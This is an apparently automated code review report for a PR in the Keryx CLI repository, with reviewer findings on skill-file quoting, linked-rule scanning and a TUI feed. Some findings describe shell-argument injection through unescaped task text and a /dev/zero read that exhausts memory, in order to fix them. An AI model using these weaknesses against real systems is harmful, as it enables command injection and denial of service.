Partial review: pr-files waived by the operator: В PR 88 файлов, в объёме ревью 33: остальные это бумаги флоу 462 (журналы, resolved) и обновления генерируемых данных

Reviewed 5382b56 — the PR has since moved on.

Commits after the reviewed head: 40eda3eb2 (fix of the four r03 majors) and 4f9f66127 (source-text audit inventory entry for project-context-inspector.test.ts).

# Review: PR #1048 (flow 462, conditional mandatory reads), delta round r03 at 5382b56abf17d23db61108554f3c6c68c8e3c036

Orchestrator: vantage-review (generic engine: review-orchestrator, Keryx v1.11.0). Keryx projection used: .metaproject/skills/gdskills/review/review-orchestrator/SKILL.md and SKILL.detail.md in the worktree.
Vantage overlays: none selected. All review-vantage-* overlays skipped: this is the Keryx Bun CLI repository, not the Vantage frontend, so no retained scope-A path matches an overlay. No project-local reviewer packages exist, so no project package override applied. Vantage rule files read: none (no overlay ran).
Reviewed SHA: 5382b56abf17d23db61108554f3c6c68c8e3c036; delta range d6267d4a5099f39b74e86a71e5c8f61ca47aa63d..5382b56abf17d23db61108554f3c6c68c8e3c036 (previous round r02, two fix commits 4838b1b40 and 5382b56ab). 37 dispatches over 9 roles in 8 slices (1 fix, 2 new, 5 second-look), all finished.

Evidence level: ran — static review plus selected execution. Three verify-run scripts were executed (escape-rule scan over the --task-text instruction sites, docs-versus-code scan for the linked-rule claim, readFile/stat comparison of scanCitations versus inspectDocument). A mutation pass over 16 test files with 12 mutants: 6 killed, 6 survived, 0 timeout, 0 invalid (research-evidence/mutation-1.json). The review-verifier checked the 6 majors: 6 confirmed, 0 refuted, 0 unverifiable (research-evidence/verifications.json). The full test suite was not run.

Stage counts: 67 raw findings from the reviewers, 31 after de-duplication by cluster (blocker 0, major 4, minor 18, info 9).

Not run: the full bun test suite, typecheck and lint (only the 16 mutation-relevant test files ran, in a scratch copy).
Not verified: the shell-level apostrophe splitting for the missing escape rule (site-check only, not executed); the ENOMEM / blocking-read outcome of reading a linked rule origin such as /dev/zero (the reviewer's own probe, not re-run); README.md:270 for the escape-rule cluster (the saved scan did not cover it).
Known-accepted: this delta round was planned without a pathspec filter, so flow-462 bookkeeping files (flow.json, journal, plan, resolved records) sit in scope A; reviewers were told they are low priority, as in r02. The 16 non-code changed files are unresolved in the blast radius, so it says nothing about skill or doc consumers; scope B reviewers checked them by search instead.
Model attribution: `ledger build` printed "model not recorded", as in r02.

## Fix dispositions (21 findings of r02 attached to the fix slice)

Nine reviewers judged each attached finding against the code at head; the line shows the votes.

- `review-clean-code-w1:F-003` **open** (open 9) — The 2.0c bullet that used to say only 'cite what you used in project_context_applied with the resolver's sha256; n/a needs a reason in notes; never ed
- `review-clean-code-w5:F-001` **open** (open 9) — Adding the References tab extended a tab-id-to-formatter mapping that is spelled out separately in four places: the nested three-way ternary in paint(
- `review-clean-code-w5:F-003` **open** (open 9) — reload() runs subscriber callbacks inside the same async function as the load, and poll() catches everything and reports it as a failed poll. A throwi
- `review-logic-w3:F-003` **open** (open 9) — A UTF-8 BOM at the start of a markdown document sits before the first '#', so the first-line heading is not recognised. The BOM is stripped for refere
- `review-style-w5:F-002` **open** (open 9) — `paint` chooses the formatter with a ternary chain (a ternary inside a ternary), and `contentRows` separately lists the same three formatters in a `Ma
- `review-highload-w2:F-001` **partial** (partial 8, closed 1) — Flow 462 makes every resolve-context dispatch in flow-orchestrator, job-orchestrator, task-implementer and tests-creator pass the task title and descr
- `review-security-code-w4:F-002` **partial** (partial 8, closed 1) — Five bundled skill files, with byte-identical managed copies under .metaproject/skills/gdskills, tell the executing agent to substitute the task title
- `review-architecture-w3:F-002` **closed** (closed 9) — scanCitations iterates listRuleRefs(), which lists only files copied under .metaproject/rules/project/. The resolver's collectProjectRules also reads 
- `review-clean-code-w2:F-004` **closed** (closed 9) — The size-limit test hard-codes 262145, one more than CONTRACT_MAX_BYTES (262144, exported from src/gdskills/context-resolver.ts). The test does not sa
- `review-highload-w2:F-002` **closed** (closed 6, withdrawn 3) — Checked, wave-1 question: parallel resolve-context runs (job-orchestrator waves) all write one last.json. writeContained writes a temp file in the sam
- `review-highload-w3:F-001` **closed** (closed 9) — The lazy `(.*?)` followed by `[ \t]*$` is quadratic on a heading line that holds a long run of spaces or tabs and then a non-space character. The same
- `review-highload-w5:F-002` **closed** (closed 9) — reload() has no in-flight guard and no ordering. The interval fires poll() regardless of whether the previous load finished, and the modal's `e` toggl
- `review-logic-w2:F-001` **closed** (closed 9) — scanCitations reads only rule files that exist on disk under .metaproject/rules/project/ (listRuleRefs is a readdir). A rule imported with `keryx skil
- `review-logic-w3:F-001` **closed** (closed 9) — The resolver treats a dead anchor as 'the whole file is the obligation' (reference-entries.ts: `sectionBytes = bytes` with the warning 'the whole file
- `review-logic-w3:F-002` **closed** (closed 9) — The not-a-word-character lookarounds are applied unconditionally. When the keyword itself begins (or ends) with a non-word character, the lookaround d
- `review-performance-w5:F-002` **closed** (closed 9) — reload() is shared by the poll, the sidebar and the modal toggle (loadStatus: reloadProjectContext) with no ordering. A poll started before the user t
- `review-security-code-w1:F-001` **closed** (closed 9) — HEADING is run on every ATX heading line of a declared document. The lazy `(.*?)` followed by `[ \t]*$` is quadratic when the heading line holds a lon
- `review-security-code-w1:F-002` **closed** (closed 9) — recordLastResolve now stores the task text (up to TASK_TEXT_MAX_CHARS = 4000 characters) in the last-resolve record. That file is `.metaproject/data/s
- `review-security-code-w3:F-001` **closed** (closed 9) — scanHeadings matches every line with a lazy `(.*?)` followed by `[ \t]*$`, and stripClosingHashes then runs `/[ \t]+#+$/` over the captured text. Both
- `review-security-code-w4:F-001` **closed** (closed 9) — recordLastResolve now writes up to 4000 characters of the raw --task-text into .metaproject/data/skills/project-context/last.json. Before this PR that
- `review-testing-practices-w2:F-008` **closed** (closed 8, partial 1) — keywordOccurs builds a Unicode-aware whole-word regex with lookarounds over letters, digits and underscore, and escapes the keyword. The tests only us

## Regressions the fixes introduced

The three scope B regression reviewers found no behaviour break in the 20-file blast radius (depth 2, cap 40, nothing dropped by the cap). The fixes still left four defects of their own, each filed in the findings below:

- The single-quote fix for `--task-text` is incomplete: only the two flow-orchestrator copies carry the `'\''` escape sentence; 8 of 10 single-quoted instruction sites (task-implementer, tests-creator, job-orchestrator SKILL.md and orchestrator-prompt.md, in both trees) do not. A task text containing an apostrophe splits the argument there. Major, 3 reviewers independently plus 8 more at lower severity.
- The docs still say a linked rule is not scanned (apply-project-rules.md:261, cli-reference.md:3491) after `scanCitations` began reading linked rules at their origin. Major.
- The new linked-rule scan reads the origin with a bare `readFile` (references-check.ts:105): no stat, no `isFile`, no size cap, unlike `inspectDocument`; it runs on every 5-second TUI poll. Major.
- The applied watermark in the TUI feed is advanced after listeners run, so a throwing subscriber bypasses the stale-load guard. Minor.

## Findings by severity

- **major** `docs/docs/guides/apply-project-rules.md` — The r03 delta makes `references check`/`suggest` scan a rule imported with `--link` at its origin (references-check.ts now reads `resolveOriginPath(origin, projectRoot)`; the new test 'a rule imported with --link is scanned at its origin' asserts it). The code comment in references-check.ts:16 was u (merged: review-style-w2:F-001, review-architecture-w2:F-002, review-clean-code-w2:F-001, review-highload-w1:F-002, review-logic-w3:F-001, review-style-w1:F-001, review-security-code-w3:F-001)
- **major** `src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md` — The r02 shell-injection fix moves --task-text to single quotes, but only flow-orchestrator states the rule that makes that safe (a ' in the text becomes '\''). task-implementer, job-orchestrator (2 sites), orchestrator-prompt (2 sites) and tests-creator give only the quoted placeholder. A descriptio (merged: review-logic-w8:F-001, review-security-code-w5:F-001, review-security-code-w7:F-001, review-architecture-w3:F-001, review-clean-code-w1:F-003, review-highload-w1:F-001, review-highload-w3:F-002, review-security-code-w1:F-101, review-style-w1:F-002, review-clean-code-w2:F-003, review-style-w2:F-007)
- **major** `src/gdskills/reference-entries.test.ts` — The fix for review-logic-w3:F-002 (conditional lookarounds in keywordOccurs) is covered by tests that the old, buggy regex also passes. The defect was a symbol-edged keyword failing when a word character sits next to that edge ('styles.css' for '.css', 'a@apply' for '@apply'). Every symbol-edge asse (review-testing-practices-w1:F-001)
- **major** `src/gdskills/references-check.ts` — scanCitations reads the origin of every link-mode project rule with a bare readFile: no lstat/stat, no isFile check, no size cap, no check that the path is inside the project. The origin is the `origin` string of a projectRuleRegistry entry in .metaproject/metaproject.json (readProjectRuleRegistry o (review-security-code-w6:F-001)
- **minor** `docs/docs/guides/apply-project-rules.md` — The statement is wrong for the printed count. In reference-entries.ts the entry's bytes is Buffer.byteLength of the whole file; only section_bytes and promotedBytes (the budget term) use the section. The example 20 lines above shows it: 'STYLING.md ... 438 bytes ... (anchor "Class conventions", sect (review-logic-w3:F-002)
- **minor** `src/commands/skills-references.test.ts` — In the new --link test the second rule's text is written out twice as the same multi-line literal: once for `writeFile(second, ...)` and again as the third argument of `entry("other.mdc", ...)`, which hashes it. (review-style-w2:F-005)
- **minor** `src/commands/skills-references.test.ts` — The closing assertion of the new --link test folds a guard into the value under test. If suggestion.ok is false, the expression evaluates to false and the failure reads 'expected ["OTHER.md"], received false', which hides the real cause (the error the suggest call returned). It also type-narrows thr (review-testing-practices-w2:F-002)
- **minor** `src/commands/skills-references.test.ts` — The new --link test only covers the happy path where the registry entry's sha256 and originSha256 match the origin file. The resolver ignores a linked rule whose recorded hash differs from the origin (the origin changed after import), but scanCitations in src/gdskills/references-check.ts reads the o (review-testing-practices-w2:F-003)
- **minor** `src/gdskills/context-resolver.test.ts` — The edit wrapped the argument in a template literal whose only content is one interpolation, which is `String("x".repeat(...))` and changes nothing. The same test then asserts absence with a bare literal `"xxxxxxxxxx"` (ten x) whose link to the repeated text is implicit. (merged: review-clean-code-w3:F-002, review-style-w2:F-004, review-style-w3:F-001)
- **minor** `src/gdskills/context-resolver.ts` — recordLastResolve now needs the full (uncut) code-point length of the task text, but truncateTaskText returns only the cut text and a flag, so the length is recomputed with a second Array.from over the whole string (truncateTaskText already built that array) and a non-null assertion (`options.taskTe (merged: review-clean-code-w3:F-001, review-style-w2:F-003, review-clean-code-w1:F-007, review-performance-w2:F-001, review-style-w1:F-003)
- **minor** `src/gdskills/reference-entries.ts` — The word-character class `[\p{L}\p{N}_]` is now spelled three times in six lines: the WORD_CHAR regex, the lookbehind string and the lookahead string. The boundary fix has to keep all three equal to be correct, and nothing links them (Clean Code E1, near-duplicate definitions that must change togeth (review-clean-code-w1:F-004)
- **minor** `src/gdskills/reference-proof.ts` — The fix for the dead-anchor proof makes currentSection return the whole file in a second case: when the declared anchor is not found in the file. The doc comment still names only one fallback (no anchor), so it now describes less than the function does (Clean Code C1, stale comment). (merged: review-clean-code-w1:F-002, review-architecture-w1:F-002)
- **minor** `src/gdskills/references-check.ts` — scanCitations now reads a linked rule from its origin, claiming to do so 'as the resolver does', but it applies none of the resolver's admission rule. collectProjectRules in context-resolver.ts reads a link-mode origin only while sha256(text) equals the sha256 pinned in the registry, otherwise it ex (merged: review-architecture-w2:F-001, review-clean-code-w1:F-001, review-logic-w1:F-002, review-security-code-w1:F-102, review-style-w1:F-004, review-architecture-w1:F-001)
- **minor** `src/gdskills/references-config.ts` — parseWhen/stringList keep each declared glob as the author typed it (trim only) and promotionReason in reference-entries.ts hands it unchanged to matchesAnyGlobWithBraces against task files that normaliseFiles has already put into project-relative posix form. The path field of the same entry goes th (review-logic-w4:F-001)
- **minor** `src/lib/glob.ts` — The new `when.globs` of .metaproject/rules/project/references.json are matched in promotionReason (reference-entries.ts) through matchesAnyGlobWithBraces. expandBraces multiplies the alternatives of every brace group (n groups of two give 2^n globs), and globToRegExp turns each `*` into `[^/]*` and  (merged: review-security-code-w4:F-001, review-security-code-w5:F-002)
- **minor** `src/tui/project-context-inspector.test.ts` — The test that proves the shell stops the feed asserts on the text of tui-shell.ts instead of on behaviour. It cuts a fixed 2500-character window after the first 'onDestroy: () => {' and checks that the window contains 'stopProjectContextFeed?.()'. It also repeats the literal 'onDestroy: () => {' and (merged: review-clean-code-w2:F-002, review-style-w2:F-008)
- **minor** `src/tui/project-context-inspector.test.ts` — Vacuous assertion (testing rule: tests must be able to fail). The test is named 'control characters from a reference never reach the terminal: tab body and sidebar value are cleaned', but the sidebar half asserts on renderProjectContextSidebarValue(status), whose references segment (referencesSideba (merged: review-testing-practices-w2:F-001, review-logic-w8:F-003, review-testing-practices-w3:F-001)
- **minor** `src/tui/project-context-inspector.ts` — The ordering guard added for the overlapping-load race records the load as applied only after the listeners have run. The open finding clean-code-w5:F-003 (listeners share the load's error path) was not fixed, and it now has a second consequence: when a subscriber throws, `current` is already advanc (merged: review-clean-code-w1:F-005, review-logic-w1:F-001, review-logic-w8:F-002)
- **minor** `src/tui/project-context-inspector.ts` — reload() drops an older load from the feed but still returns that older `next` to its caller, and `applied` is only advanced after the subscriber loop. (a) A modal toggle calls loadStatus() = feed.reload() (mine=1); a poll starts after it (mine=2) and finishes first, so the feed holds the newer stat (merged: review-highload-w3:F-001, review-logic-w6:F-002)
- **minor** `src/tui/project-context-inspector.ts` — The r02 fix for the References tab escaping routes every line through cardSafe (src/lib/card-safe.ts), which was written for model-supplied card text. The repository's helper for committed, attacker-controlled files is terminalSafe/terminalSafeBlock (src/lib/terminal-safe.ts), whose header says why: (review-security-code-w6:F-002)
- **minor** `src/tui/project-context-inspector.ts` — The new import sits between two sibling (`./`) imports. Every other import in the block is ordered type-only project imports, then siblings alphabetically; a `../lib` import in the middle breaks both the grouping and the order. (merged: review-style-w2:F-002, review-style-w3:F-002)
- **minor** `src/tui/project-references-view.ts` — A promoted reference row prints 'over the cap: <used> of <limit> bytes' whenever result.budget.exceeded is true. The resolver sets that flag in two ways: promoted bytes push the total over the limit (usedBytes > limitBytes, the sentence is true), or a plain rule or skill did not fit and fit() set ex (review-logic-w6:F-001)
- **info** `.metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md` — The instruction says every entry promoted by a condition carries an anchor and section_bytes and that the worker's item needs the anchor exactly as declared. In the resolver the anchor is optional: reference-entries.ts emits `anchor` and `section_bytes` only when the declaration has an anchor, and p (review-logic-w2:F-001)
- **info** `src/commands/skills-references.ts` — Only --json is read, from anywhere in args. A mistyped flag (check --jsn) or an unsupported one (suggest --json) is silently ignored and text or JSON of the default shape is printed. (review-logic-w3:F-003)
- **info** `src/gdskills/context-resolver.ts` — The recorded length counts code points with Array.from, the same way truncateTaskText cuts. Every test that reads taskTextLength (context-resolver.test.ts:428, 434, 448 and conditional-reads.e2e.test.ts:520) uses ASCII text, and the e2e expectation is itself written with Array.from, so replacing the (review-testing-practices-w3:F-002)
- **info** `src/gdskills/reference-entries.test.ts` — Magic number in the new test; the production cap for a cited document is already a named export. (review-style-w2:F-006)
- **info** `src/gdskills/reference-proof.ts` — The anchor in the proof item is compared with the declared anchor by raw string equality, while the summary words are NFC-normalised (distinctWords) and the schema adds the anchor as a free string. An anchor containing a non-ASCII character (for example an accented or Cyrillic heading) that the work (review-logic-w2:F-002)
- **info** `src/gdskills/references-section.test.ts` — A wall-clock bound is used to prove the heading parser is linear. The inputs are 120k-blank lines and the old regexes took many seconds, so the 1000 ms margin is large and the flake risk is low. It is still a timing assertion, which depends on the machine, and it does not distinguish linear from mil (review-testing-practices-w2:F-004)
- **info** `src/gdskills/resolved-context-check.ts` — Whether an entry owes the proof is read from the resolved JSON itself (`tier === "must_read"` and `reason` starting with `condition:`). checkResolvedContext does not re-run the resolver against references.json and the task files, and the task text is deliberately not kept (last.json stores a length  (review-security-code-w4:F-002)
- **info** `src/tui/project-context-inspector.ts` — `started` and `applied` are sequence counters, but their names read as booleans next to `failing` and `polling`, and `mine` for the local ticket says nothing about what it is a ticket for (Clean Code A1). (review-clean-code-w1:F-006)
- **info** `src/tui/project-context-inspector.ts` — The polling latch clears only in finally. A load that never settles would stop all later polling for the session. No current path hangs; not reproduced. (review-logic-w8:F-004)

## Questions

- `src/gdskills/resolved-context-check.ts` — Whether an entry owes the proof is read from the resolved JSON itself (`tier === "must_read"` and `reason` starting with `condition:`). checkResolvedContext does not re-run the resolver against references.json and the task files, and the task text is deliberat (review-security-code-w4:F-002)
- `src/tui/project-context-inspector.ts` — The polling latch clears only in finally. A load that never settles would stop all later polling for the session. No current path hangs; not reproduced. (review-logic-w8:F-004)

## Pre-existing

None classified as pre-existing by reviewers. The r02 findings still open at head are listed under Fix dispositions above.

## Verified clean

- Blast radius: no regression in dependants of the changed contracts. `RecordedResolve.taskText` has no non-test reader left, so its replacement by `taskTextLength` / `taskTextTruncated` breaks nothing; an old `last.json` that still carries `taskText` still loads. The dead-anchor fallback in `reference-proof.ts` still blocks under enforcement through the drift arm. The skill files changed in the `.metaproject` and bundled trees are byte-identical (skill-sync parity holds).
- Heading parser: the quadratic regexes were replaced by a linear scan (probe: 320000-space heading lines parsed in 31 ms).
- Keyword boundaries: lookarounds now apply only on a side that starts or ends with a word character; the r02 logic defect no longer reproduces.
- Security: schemas keep `additionalProperties: false` and the anchored sha256 pattern in core, managed and bundled copies; `--out` is written through `writeContained`; the sidebar value still passes `cardSafe`; no secrets in the bookkeeping records.
- r02 findings closed at head by most votes: every attached finding except the five open and two partial listed under Fix dispositions.
- Vantage overlays: none applicable (Keryx repository, no frontend source).

```json keryx:findings
[
  {
    "id": "review-architecture-w1:F-001",
    "severity": "info",
    "file": "src/gdskills/references-check.ts",
    "line": null,
    "quote": ".filter((entry) => entry.mode === \"link\" && !copies.includes(entry.ref))",
    "problem": "The fix for the linked-rules finding re-implements the resolver's link reading inside scanCitations instead of sharing collectProjectRules. The two copies already differ: collectProjectRules excludes a linked rule whose origin is unreadable or whose sha256 no longer matches the registry entry (with a warning), scanCitations reads the origin without that gate. For a linked rule, scanCitations also records the virtual path `.metaproject/rules/project/<ref>`, where no file exists (the resolver uses the origin path), and that path is what `undeclared-citation` ('cited by ...') and `rule-unreadable` print.",
    "impact": "Edge only: after a linked file changed since linking, the resolver drops the rule and its citations while `references check` / `suggest` still count them, so the two tools disagree for one project in that state. For any linked rule, the 'cited by <path>' message points at a path that does not exist. Neither changes the main case the previous finding was about, which is now correct and tested (skills-references.test.ts:333).",
    "suggested_fix": "When convenient, factor a 'rule texts of this project, copied and linked' helper out of context-resolver.ts that both collectProjectRules and scanCitations call, so the exclusion policy (copy wins, sha256 gate) lives once; carry the origin path for linked rules so the messages name a file that exists. Otherwise reword the header comment from 'as the resolver does' to say the sha256 gate is not applied.",
    "evidence": "Head src/gdskills/references-check.ts:97-109 (links map built from the registry, readFile on resolveOriginPath, rulePath = PROJECT_RULES_DIR/ref for both kinds). Head src/gdskills/context-resolver.ts:205-229: collectProjectRules checks `sha256Hex(text) !== entry.sha256` and pushes a warning, then `continue`; it names `origin` as the candidate path.",
    "confidence": "medium",
    "reviewer": "review-architecture",
    "dedupe_key": "scancitations-linked-rule-parity",
    "location_class": "in-diff"
  },
  {
    "id": "review-architecture-w1:F-002",
    "severity": "info",
    "file": "src/gdskills/reference-proof.ts",
    "line": null,
    "quote": "if (!section.found) return { ok: true, text, what:",
    "problem": "The dead-anchor policy ('an anchor that is not found makes the whole file the obligation') now lives in two places that must agree: reference-entries.ts resolveReferences (sectionBytes = bytes, warning) and reference-proof.ts currentSection (whole-file text for the words check). Each calls extractSection and branches on `found` on its own. The previous finding was exactly a disagreement between these two, and the fix repairs it by making the validator copy the resolver's branch, not by giving both one function.",
    "impact": "No wrong behaviour today; both branches agree and the new test at resolved-context-check.test.ts:296 pins the validator side. A later change to the fallback (say, refuse to promote an entry with a dead anchor) has to be made in both files, and a miss reopens the unsatisfiable-proof defect.",
    "suggested_fix": "Put the policy in references-section.ts, for example `sectionOrWhole(markdown, anchor): { text: string; bytes: number; fellBack: boolean; reason?: string }`, and have resolveReferences and currentSection both call it.",
    "evidence": "Head reference-entries.ts:106-116 (found ? section.bytes : whole-file bytes plus warning) and head reference-proof.ts currentSection (found ? section.text : whole text); the only two non-authoring callers of extractSection (references-check.ts declarationFindings reports the dead anchor as an error on purpose).",
    "confidence": "medium",
    "reviewer": "review-architecture",
    "dedupe_key": "dead-anchor-policy-duplicated",
    "location_class": "in-diff"
  },
  {
    "id": "review-architecture-w2:F-001",
    "severity": "minor",
    "file": "src/gdskills/references-check.ts",
    "line": null,
    "quote": "// `skills import --link` leaves no copy: the rule is read where it lives, as the resolver does.",
    "problem": "scanCitations now reads a linked rule from its origin, claiming to do so 'as the resolver does', but it applies none of the resolver's admission rule. collectProjectRules in context-resolver.ts reads a link-mode origin only while sha256(text) equals the sha256 pinned in the registry, otherwise it excludes the rule with a warning. The checker has no such pin check, so it keeps its own second copy of 'which rule files exist' that has drifted from the engine's. This narrows review-architecture-w3:F-002 (checker did not see linked rules at all) without closing the underlying duplication.",
    "impact": "For a linked rule whose origin changed after registration, the resolver drops the rule (nothing is promoted or cited from it) while `skills references check` and the project-context status (readReferences calls checkReferences) still report its citations as resolved or unresolved. The check then validates a rule set the engine does not use, and the sidebar/References tab can show citation results for a rule that is not in the resolved context. The window is small (drifted links only), hence minor.",
    "suggested_fix": "Take the set of readable project rules from one function shared by the resolver and the checker (the resolver's collectProjectRules, or a small helper both call) that returns the rule text after the sha256 pin check. Have scanCitations consume that result instead of re-implementing the copy/link read, and surface a drifted link as a warning, as the resolver does.",
    "evidence": "references-check.ts scanCitations builds `links` from readProjectRuleRegistry (mode === 'link', no copy) and reads `resolveOriginPath(origin, projectRoot)` directly. context-resolver.ts lines ~205-230 read the origin only when `sha256Hex(text) === entry.sha256`. project-context-status.ts readReferences calls loadReferences and then checkReferences, so the checker's view feeds the TUI. Prior finding for the same boundary: review-architecture-w3:F-002.",
    "confidence": "high",
    "reviewer": "review-architecture",
    "dedupe_key": "scancitations-linked-rule-parity"
  },
  {
    "id": "review-architecture-w2:F-002",
    "severity": "minor",
    "file": "docs/docs/guides/apply-project-rules.md",
    "line": null,
    "quote": "only: a rule imported with `--link` is not scanned, and neither are bundled",
    "problem": "The guide states that the citation scan skips rules imported with `--link`. This slice changes scanCitations to scan linked rules at their origin, so the sentence now contradicts the code. The `references check` row in docs/docs/cli-reference.md (line ~3491) carries the same claim ('a linked rule is not scanned') and is equally stale.",
    "impact": "A user relying on the documented limit will not expect `skills references check` to report unresolved citations from a linked rule, and may conclude a clean check covers less than it does, or that a linked-rule citation error is a bug. The doc is the contract for the command's scope.",
    "suggested_fix": "Reword both places: the scan covers project rules, copied or linked (a linked rule is read at its origin); bundled rules are still not scanned. If F-001 is fixed, add that a link whose origin no longer matches its recorded sha256 is skipped with a warning.",
    "evidence": "apply-project-rules.md line 261 and cli-reference.md line ~3491 versus references-check.ts line 98 and the `links` map in scanCitations. A search of docs/ and README.md for 'not scanned' / 'linked rule' found no other statement of this limit.",
    "confidence": "high",
    "reviewer": "review-architecture",
    "dedupe_key": "docs-linked-rule-not-scanned"
  },
  {
    "id": "review-architecture-w3:F-001",
    "severity": "minor",
    "file": "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md",
    "line": null,
    "quote": "--task-text '<task title and description>'",
    "problem": "This slice moves the model-composed `skills resolve-context` command from double to single quotes so that a backtick or `$(...)` in a task description is not executed. The rule that makes single quotes safe, 'a `'` inside it becomes `'\\''`', is stated only in flow-orchestrator/SKILL.md (line 323). The other sites that tell a model to build the same command carry the single quotes with no escape rule: job-orchestrator/SKILL.md lines 749 and 1307, job-orchestrator/orchestrator-prompt.md lines 132 and 188, task-implementer/SKILL.md line 182, and tests-creator/SKILL.md line 93. A task title or description with an apostrophe (\"don't\", \"the button's\") is common, and inside '...' it ends the quoted string. The one site that does state the rule also writes its own placeholder as `'<the task's title and description>'`, an unescaped apostrophe inside single quotes. So the rule for how untrusted text crosses into a shell command exists as prose in one place and is copied without its condition into the rest. The boundary has no structured entry on the CLI side: resolve-context-command.ts reads the text only through `optionValue(args, \"--task-text\")`, with no file or stdin form, although the harness and MCP paths already take a structured `task_text` field.",
    "impact": "A worker or orchestrator following job-orchestrator, task-implementer or tests-creator on a description containing an apostrophe produces a command with an unterminated quote or a split argument. The result is either a shell error, which is loud, or a truncated `--task-text` that silently stops a keyword from promoting a reference. The promotion step is what this feature relies on. The injection the slice set out to close stays closed only where the escape rule is read. The sites will drift further apart because each is edited separately, in two mirrored trees each.",
    "suggested_fix": "Give the CLI a form that needs no quoting (`--task-text-file <path>` or `--task-text -` reading stdin) and have the six sites write the description to a file or pipe it, so the quoting question disappears. Short of that, put the single-quote rule in one shared place (the resolve-context row of docs/docs/cli-reference.md or one rule file) and make each site say 'quote it as described there'. Either way, fix the placeholder in flow-orchestrator/SKILL.md so it contains no apostrophe, e.g. `<task title and description>`.",
    "evidence": "Searched `--task-text` across .metaproject/skills, src/gdskills/bundled, docs and README (excluding flows and reviews) and searched for the literal `'\\''` in the same trees. The escape rule appears only in flow-orchestrator/SKILL.md line 323, in both the .metaproject and src/gdskills/bundled copies. `cmp` shows the five skill files identical between .metaproject/skills/gdskills and src/gdskills/bundled/skills, so every site is doubled. Fixed-literal double-quoted examples also remain in docs/docs/guides/apply-project-rules.md line 172 and docs/requirements/keryx-conditional-reads/live-run.md lines 136, 155 and 170. They are harmless as literals, but they teach the form the skills now forbid for variable text.",
    "confidence": "high",
    "reviewer": "review-architecture",
    "dedupe_key": "task-text-escape-rule-missing",
    "class_scope": {
      "sites": [
        "src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323 (states the rule)",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132",
        "src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188",
        "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
        "src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
        "the same seven lines in .metaproject/skills/gdskills/ (byte-identical mirrors)",
        "docs/docs/guides/apply-project-rules.md:172",
        "docs/requirements/keryx-conditional-reads/live-run.md:136,155,170"
      ],
      "enumeration_method": "keryx ctx rg for `--task-text` over .metaproject/skills, src/gdskills/bundled, docs and README, minus flows and reviews; a second search for the literal `'\\''` showing it only in flow-orchestrator; cmp of the five skill files between the two trees"
    }
  },
  {
    "id": "review-clean-code-w1:F-001",
    "severity": "minor",
    "file": "src/gdskills/references-check.ts",
    "line": null,
    "quote": "the rule is read where it lives, as the resolver does.",
    "problem": "The new comment says a linked rule is read 'as the resolver does', but the resolver does more than read it. collectProjectRules also excludes a linked rule whose origin cannot be read and one whose sha256 no longer equals the registry's, each with a warning. scanCitations reads the origin and scans whatever it finds, with no sha256 pin. The comment claims a parity that is not there (Clean Code C1, a comment that misleads). The registry filter, origin read and fallback are also a second copy of the linked-rule reading logic the finding that prompted this fix asked to share; the long chained filter/map on the `links` line makes the loop harder to read.",
    "impact": "Trigger: a linked rule edited after `skills import --link` and not yet re-synced with `skills update --rules`. The resolver excludes it (no citations seen, warning printed), while `references check|suggest` still scans its new text. Check and resolver can then disagree about which documents are cited, the same class of disagreement the fix set out to remove, now only for a changed link. Low frequency; the reader of the comment is the one misled.",
    "suggested_fix": "Either make the comment true (skip a linked rule whose sha256 differs from entry.sha256 and report it as rule-unreadable, as the resolver excludes it) or reword it: 'the rule is read where it lives; unlike the resolver, its sha256 pin is not checked'. Prefer extracting the 'rule texts of this project, copied and linked' function from context-resolver.ts so both callers share it.",
    "evidence": "references-check.ts scanCitations (head lines 97-109) versus context-resolver.ts collectProjectRules lines 215-227: `if (sha256Hex(text) !== entry.sha256) { warnings.push(...); continue; }` has no counterpart in scanCitations.",
    "confidence": "medium",
    "reviewer": "review-clean-code",
    "dedupe_key": "scancitations-linked-rule-parity"
  },
  {
    "id": "review-clean-code-w1:F-002",
    "severity": "minor",
    "file": "src/gdskills/reference-proof.ts",
    "line": null,
    "quote": "/** The anchored section of the file as it is now, or the whole file when the declaration has no anchor. */",
    "problem": "The fix for the dead-anchor proof makes currentSection return the whole file in a second case: when the declared anchor is not found in the file. The doc comment still names only one fallback (no anchor), so it now describes less than the function does (Clean Code C1, stale comment).",
    "impact": "A reader of the JSDoc, or of the SectionOutcome type above it, concludes that `ok: true` with whole-file text means 'no anchor declared'. The next editor who tightens the dead-anchor case (for example by turning it back into an ok:false) has no signal in the doc that this behaviour is deliberate and mirrors the resolver. Readability only; no wrong behaviour.",
    "suggested_fix": "Extend the comment: 'The anchored section as it is now; the whole file when the declaration has no anchor or when the anchor is no longer found (the resolver treats a dead anchor the same way).'",
    "evidence": "reference-proof.ts head lines 51-65: the inline comment at line 62 and the `what` text document the dead-anchor case; the JSDoc on line 51 does not.",
    "confidence": "high",
    "reviewer": "review-clean-code",
    "dedupe_key": "dead-anchor-policy-duplicated"
  },
  {
    "id": "review-clean-code-w1:F-003",
    "severity": "minor",
    "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
    "line": null,
    "quote": "--task-text '<task.description>'",
    "problem": "The task-text shell-quoting fix was applied by swapping double quotes for single quotes at every site, but the instruction that makes single quotes safe ('a `'` inside it becomes `'\\''`') was added at one site only: flow-orchestrator/SKILL.md. The other dispatch sites that tell an agent to paste free text into the same argument (task-implementer 2.0c, tests-creator 1.2b, job-orchestrator Step A and the fix loop, orchestrator-prompt step 1 and FIX step 2) give the single-quoted template with no escape rule. Task descriptions contain apostrophes constantly ('don't', 'the task's'). The flow-orchestrator template itself writes `'<the task's title and description>'`, an apostrophe inside the single-quoted example.",
